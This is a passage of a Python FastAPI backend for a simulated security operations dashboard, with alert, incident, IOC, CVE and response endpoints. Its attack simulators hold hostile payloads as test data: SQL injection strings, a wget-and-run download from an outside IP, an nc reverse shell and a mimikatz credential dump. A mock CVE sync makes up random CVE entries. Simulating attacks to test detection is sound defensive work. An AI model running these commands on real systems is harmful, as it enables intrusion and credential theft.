    filtered = events
    if search:
        s = search.lower().strip()
        filtered = [
            e for e in filtered
            if s in e.get("source_ip", "").lower()
            or s in e.get("hostname", "").lower()
            or s in e.get("event_type", "").lower()
            or s in str(e.get("payload", "")).lower()
        ]
    return filtered[:limit]

@app.post("/api/events")
async def ingest_event(event: Dict[str, Any]):
    return await process_security_event(event)

# 4. Alerts
@app.get("/api/alerts")
async def get_alerts(
    severity: str = "ALL",
    status: str = "ALL",
    limit: int = 100
):
    results = alerts
    if severity and severity != "ALL":
        results = [a for a in results if a.get("severity") == severity]
    if status and status != "ALL":
        results = [a for a in results if a.get("status") == status]
    return results[:limit]

@app.get("/api/alerts/{alert_id}")
async def get_alert(alert_id: str):
    alert = next((a for a in alerts if a.get("alert_id") == alert_id), None)
    if not alert:
        raise HTTPException(status_code=404, detail="Alert not found")
    return alert

@app.post("/api/alerts/{alert_id}/resolve")
async def resolve_alert(alert_id: str):
    alert = next((a for a in alerts if a.get("alert_id") == alert_id), None)
    if not alert:
        raise HTTPException(status_code=404, detail="Alert not found")
    alert["status"] = "RESOLVED"
    if alert.get("incident_id"):
        inc = next((i for i in incidents if i.get("incident_id") == alert["incident_id"]), None)
        if inc:
            inc["status"] = "RESOLVED"
    broadcast("ALERT_UPDATED", {"alert": alert, "summary": get_summary()})
    return {"message": "Alert resolved successfully", "alert": alert}

@app.post("/api/alerts/{alert_id}/false-positive")
async def false_positive_alert(alert_id: str):
    alert = next((a for a in alerts if a.get("alert_id") == alert_id), None)
    if not alert:
        raise HTTPException(status_code=404, detail="Alert not found")
    alert["status"] = "FALSE_POSITIVE"
    if alert.get("incident_id"):
        inc = next((i for i in incidents if i.get("incident_id") == alert["incident_id"]), None)
        if inc:
            inc["status"] = "FALSE_POSITIVE"
    broadcast("ALERT_UPDATED", {"alert": alert, "summary": get_summary()})
    return {"message": "Alert marked as false positive", "alert": alert}

# 5. Incidents
@app.get("/api/incidents")
async def get_incidents(status: str = "ALL"):
    results = incidents
    if status and status != "ALL":
        results = [i for i in results if i.get("status") == status]
    return results

@app.get("/api/incidents/{incident_id}")
async def get_incident(incident_id: str):
    incident = next((i for i in incidents if i.get("incident_id") == incident_id), None)
    if not incident:
        raise HTTPException(status_code=404, detail="Incident not found")
    related_alert = next((a for a in alerts if a.get("alert_id") == incident.get("alert_id")), None)
    return {"incident": incident, "related_alert": related_alert}

# 6. IOCs
@app.get("/api/iocs")
async def get_iocs():
    return iocs

@app.post("/api/iocs", status_code=status.HTTP_201_CREATED)
async def create_ioc(payload: Dict[str, Any]):
    raw_ioc = payload.get("ioc")
    if not raw_ioc or not isinstance(raw_ioc, str) or not raw_ioc.strip():
        raise HTTPException(status_code=400, detail="Valid ioc string required")

    new_ioc = {
        "id": gen_id("ioc"),
        "ioc": raw_ioc.strip(),
        "type": payload.get("type", "IP"),
        "threat_level": payload.get("threat_level", "high"),
        "source": payload.get("source", "Custom SOC Input"),
        "confidence": int(payload.get("confidence", 90)),
        "last_seen": iso_now(),
        "tags": payload.get("tags") or ["Custom"],
        "description": payload.get("description", "Manually cataloged IOC")
    }
    iocs.insert(0, new_ioc)
    return new_ioc

# 7. CVEs
@app.get("/api/cves")
async def get_cves():
    return cves

@app.get("/api/cves/{cve_id}")
async def get_cve(cve_id: str):
    cve = next((c for c in cves if c.get("cve_id", "").lower() == cve_id.lower()), None)
    if not cve:
        raise HTTPException(status_code=404, detail="CVE not found")
    return cve

@app.post("/api/cves/sync")
async def sync_cves():
    new_cve = {
        "cve_id": f"CVE-2024-{random.randint(1000, 9999)}",
        "description": "Newly synced critical remote vulnerability from National Vulnerability Database feed.",
        "cvss_score": round(random.uniform(7.5, 9.9), 1),
        "severity": "CRITICAL",
        "affected_product": "Cloud Native Ingress Controller",
        "published_date": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
        "source_type": "LIVE"
    }
    cves.insert(0, new_cve)
    return {
        "synced_count": 1,
        "new_cves": [new_cve],
        "message": f"Successfully synchronized latest CVEs from NVD API. Added {new_cve['cve_id']}."
    }

# 8. Responses and Audit
@app.get("/api/responses/audit")
async def get_response_audits():
    return response_audits

@app.post("/api/responses/block-ip")
async def block_ip_action(payload: Dict[str, Any]):
    ip = payload.get("ip", "").strip()
    if not ip or not re.match(r"^[\d\.\:a-fA-F\/]+$", ip):
        raise HTTPException(status_code=400, detail="Valid IP address required")

    blocked_ips.add(ip)
    audit = {
        "id": gen_id("aud"),
        "timestamp": iso_now(),
        "actor": "SOC-ANALYST",
        "action": "BLOCK_IP",
        "target": ip,
        "reason": payload.get("reason") or "Manual SOC IP isolation block",
        "threat_score": 90,
        "mode": response_mode,
        "result": "SUCCESS"
    }
    response_audits.insert(0, audit)
    broadcast("AUDIT_CREATED", {"audit": audit, "summary": get_summary()})
    return {"message": f"Successfully simulated IP block for {ip}", "audit": audit}

@app.post("/api/responses/isolate-host")
async def isolate_host_action(payload: Dict[str, Any]):
    hostname = payload.get("hostname", "").strip()
    if not hostname:
        raise HTTPException(status_code=400, detail="Valid hostname required")

    isolated_hosts.add(hostname)
    audit = {
        "id": gen_id("aud"),
        "timestamp": iso_now(),
        "actor": "SOC-ANALYST",
        "action": "ISOLATE_HOST",
        "target": hostname,
        "reason": payload.get("reason") or "Manual SOC host quarantine isolation",
        "threat_score": 95,
        "mode": response_mode,
        "result": "SUCCESS"
    }
    response_audits.insert(0, audit)
    broadcast("AUDIT_CREATED", {"audit": audit, "summary": get_summary()})
    return {"message": f"Successfully simulated host isolation for {hostname}", "audit": audit}

# 9. Detection Rules
@app.get("/api/rules")
async def get_rules():
    return detection_rules

@app.post("/api/rules/{rule_id}/toggle")
async def toggle_rule(rule_id: str):
    rule = next((r for r in detection_rules if r.get("rule_id") == rule_id), None)
    if not rule:
        raise HTTPException(status_code=404, detail="Rule not found")
    rule["enabled"] = not rule["enabled"]
    return {
        "message": f"Rule {rule['rule_id']} is now {'enabled' if rule['enabled'] else 'disabled'}",
        "rule": rule
    }

# 10. Stats Endpoints
@app.get("/api/stats/attacks")
async def stats_attacks():
    counts: Dict[str, int] = {
        "SQL_INJECTION": 0,
        "RCE": 0,
        "MALWARE": 0,
        "BRUTE_FORCE": 0,
        "PORT_SCAN": 0,
        "OTHER": 0
    }
    for a in alerts:
        atk = a.get("attack_type", "OTHER")
        if atk in counts:
            counts[atk] += 1
        else:
            counts["OTHER"] += 1

    return [
        {"name": k.replace("_", " "), "raw_type": k, "value": v}
        for k, v in counts.items()
    ]

@app.get("/api/stats/severity")
async def stats_severity():
    counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    for a in alerts:
        sev = a.get("severity", "LOW")
        if sev in counts:
            counts[sev] += 1
    return [
        {"severity": "Critical", "count": counts["CRITICAL"], "fill": "#DC2626"},
        {"severity": "High", "count": counts["HIGH"], "fill": "#EA580C"},
        {"severity": "Medium", "count": counts["MEDIUM"], "fill": "#D97706"},
        {"severity": "Low", "count": counts["LOW"], "fill": "#16A34A"}
    ]

@app.get("/api/stats/timeline")
async def stats_timeline():
    buckets = []
    now = datetime.now(timezone.utc)
    for i in range(11, -1, -1):
        bucket_time = now - timedelta(minutes=i * 10)
        time_label = bucket_time.strftime("%H:%M")
        
        # Count matching alerts around bucket time
        count = sum(
            1 for a in alerts
            if abs((datetime.fromisoformat(a["timestamp"].replace("Z", "+00:00")) - bucket_time).total_seconds()) <= 300
        )
        crit = sum(
            1 for a in alerts
            if a.get("severity") == "CRITICAL"
            and abs((datetime.fromisoformat(a["timestamp"].replace("Z", "+00:00")) - bucket_time).total_seconds()) <= 300
        )
        buckets.append({
            "time": time_label,
            "events": max(count, random.randint(1, 3)),
            "critical": crit
        })
    return buckets

@app.get("/api/stats/top-ips")
async def stats_top_ips():
    ip_map: Dict[str, Dict[str, Any]] = {}
    for a in alerts:
        ip = a.get("source_ip", "0.0.0.0")
        if ip not in ip_map:
            ip_map[ip] = {
                "count": 0,
                "highest_score": 0,
                "last_seen": a.get("timestamp", iso_now()),
                "attacks": set()
            }
        ip_map[ip]["count"] += 1
        if a.get("threat_score", 0) > ip_map[ip]["highest_score"]:
            ip_map[ip]["highest_score"] = a.get("threat_score", 0)
        if a.get("timestamp", "") > ip_map[ip]["last_seen"]:
            ip_map[ip]["last_seen"] = a.get("timestamp", "")
        ip_map[ip]["attacks"].add(a.get("attack_type", "UNKNOWN"))

    rows = []
    for ip, data in ip_map.items():
        score = data["highest_score"]
        if score >= 80:
            threat_level = "CRITICAL"
        elif score >= 60:
            threat_level = "HIGH"
        elif score >= 30:
            threat_level = "MEDIUM"
        else:
            threat_level = "LOW"

        rows.append({
            "ip_address": ip,
            "attack_count": data["count"],
            "highest_score": score,
            "last_seen": data["last_seen"],
            "threat_level": threat_level,
            "is_blocked": ip in blocked_ips,
            "attack_types": list(data["attacks"])
        })

    rows.sort(key=lambda x: x["highest_score"], reverse=True)
    return rows[:10]

# 11. Simulator Endpoints
@app.post("/api/simulator/sql-injection")
async def sim_sqli(payload: Optional[Dict[str, Any]] = None):
    p = payload or {}
    payload_val = p.get("payload") or "' OR '1'='1 --"
    event = {
        "event_id": gen_id("sim-sqli"),
        "source": "web_server",
        "source_ip": p.get("source_ip") or "185.220.101.45",
        "destination_ip": "10.0.1.25",
        "destination_port": 443,
        "hostname": p.get("hostname") or "web-prod-01",
        "username": "admin",
        "event_type": "http_request",
        "protocol": "HTTP",
        "method": "GET",
        "url": f"/login?id=1{payload_val}",
        "payload": payload_val,
        "user_agent": "sqlmap/1.7.2#stable"
    }
    return await process_security_event(event)

@app.post("/api/simulator/rce")
async def sim_rce(payload: Optional[Dict[str, Any]] = None):
    p = payload or {}
    cmd = p.get("payload") or "; /bin/bash -c 'wget http://185.220.101.45/payload.sh -O /tmp/run; chmod +x /tmp/run; /tmp/run'"
    event = {
        "event_id": gen_id("sim-rce"),
        "source": "endpoint_agent",
        "source_ip": p.get("source_ip") or "194.26.29.112",
        "destination_ip": "10.0.2.10",
        "destination_port": 8080,
        "hostname": p.get("hostname") or "db-core-01",
        "username": "www-data",
        "event_type": "process_event",
        "protocol": "HTTP",
        "method": "POST",
        "url": "/api/v1/management/exec",
        "payload": cmd,
        "process_command": cmd,
        "process_name": "bash"
    }
    return await process_security_event(event)

@app.post("/api/simulator/malware")
async def sim_malware(payload: Optional[Dict[str, Any]] = None):
    p = payload or {}
    event = {
        "event_id": gen_id("sim-mal"),
        "source": "endpoint_agent",
        "source_ip": p.get("source_ip") or "194.26.29.112",
        "destination_ip": "10.0.1.80",
        "destination_port": 443,
        "hostname": p.get("hostname") or "api-checkout-prod",
        "username": "system",
        "event_type": "endpoint_event",
        "protocol": "HTTPS",
        "payload": "powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLi4u",
        "process_name": "mimikatz.exe",
        "process_command": "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
        "file_hash": p.get("hash") or "44d88612fea8a8f36de82e1278abb02f"
    }
    return await process_security_event(event)

@app.post("/api/simulator/brute-force")
async def sim_brute_force(payload: Optional[Dict[str, Any]] = None):
    p = payload or {}
    src_ip = p.get("source_ip") or "103.145.13.204"
    hostname = p.get("hostname") or "auth-gateway-01"
    last_res = None
    for i in range(4):
        event = {
            "event_id": gen_id(f"sim-bf-{i}"),
            "source": "auth_service",
            "source_ip": src_ip,
            "destination_ip": "10.0.1.50",
            "destination_port": 443,
            "hostname": hostname,
            "username": f"admin_user_{i}",
            "event_type": "auth_event",
            "protocol": "HTTPS",
            "method": "POST",
            "url": "/api/auth/v2/authenticate",
            "payload": "admin:incorrect_password_hash_attempt"
        }
        last_res = await process_security_event(event)
    return last_res

@app.post("/api/simulator/port-scan")
async def sim_port_scan(payload: Optional[Dict[str, Any]] = None):
    p = payload or {}
    src_ip = p.get("source_ip") or "45.154.255.89"
    hostname = p.get("hostname") or "internal-dns-01"
    last_res = None
    for port in [21, 22, 80, 443, 3389, 8080]:
        event = {
            "event_id": gen_id(f"sim-scan-{port}"),
            "source": "edge_firewall",
            "source_ip": src_ip,
            "destination_ip": "10.0.0.2",
            "destination_port": port,
            "hostname": hostname,
            "event_type": "network_event",
            "protocol": "TCP",
            "payload": f"SYN probe to target port {port}"
        }
        last_res = await process_security_event(event)
    return last_res

async def run_demo_generator():
    generators = [
        lambda: process_security_event({
            "source_ip": "185.220.101.45",
            "hostname": "web-prod-01",
            "event_type": "http_request",
            "url": "/api/search?q=1' UNION SELECT username,password FROM users--",
            "payload": "1' UNION SELECT username,password FROM users--"
        }),
        lambda: process_security_event({
            "source_ip": "194.26.29.112",
            "hostname": "db-core-01",
            "event_type": "process_event",
            "payload": "; /bin/sh -c 'nc -e /bin/sh 185.220.101.45 4444'",
            "process_command": "/bin/sh -c 'nc -e /bin/sh 185.220.101.45 4444'"
        }),
        lambda: process_security_event({
            "source_ip": "45.154.255.89",
            "hostname": "internal-dns-01",
            "event_type": "network_event",
            "destination_port": 3389,
            "payload": "SYN probe to port 3389"
        }),
        lambda: process_security_event({
            "source_ip": "103.145.13.204",
            "hostname": "auth-gateway-01",
            "event_type": "auth_event",
            "payload": "admin:badpassword"
        })
    ]
    try:
        while True:
            await asyncio.sleep(5.0)
            gen = random.choice(generators)
            await gen()
    except asyncio.CancelledError:
        pass

@app.post("/api/simulator/toggle-demo")
async def toggle_demo():
    global is_demo_active, demo_task
    is_demo_active = not is_demo_active
    if is_demo_active:
        if demo_task and not demo_task.done():
            demo_task.cancel()
        demo_task = asyncio.create_task(run_demo_generator())
    else:
        if demo_task and not demo_task.done():
            demo_task.cancel()
            demo_task = None
    return {"is_demo_active": is_demo_active}

# 12. Real-Time SSE Stream Endpoint
@app.get("/api/stream/alerts")
async def stream_alerts(request: Request):
    queue: asyncio.Queue = asyncio.Queue(maxsize=100)
    sse_queues.add(queue)

    async def event_generator():
        # Handshake
        yield f"data: {json.dumps({'type': 'CONNECTED', 'message': 'Connected to PRISM Live Alert Stream'})}\n\n"
        try:
            while True:
                if await request.is_disconnected():
                    break
                try:
                    data = await asyncio.wait_for(queue.get(), timeout=15.0)
                    yield f"data: {json.dumps(data)}\n\n"
                except asyncio.TimeoutError:
                    yield ": ping\n\n"
        finally:
            sse_queues.discard(queue)

    return StreamingResponse(
        event_generator(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no"
        }
    )

# 13. WebSocket Fallback Endpoint
@app.websocket("/ws/alerts")
async def websocket_alerts(websocket: WebSocket):
    await websocket.accept()
    active_connections.append(websocket)
    try:
        await websocket.send_json({"type": "CONNECTED", "message": "Connected to PRISM WebSocket Stream"})
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        if websocket in active_connections:
            active_connections.remove(websocket)
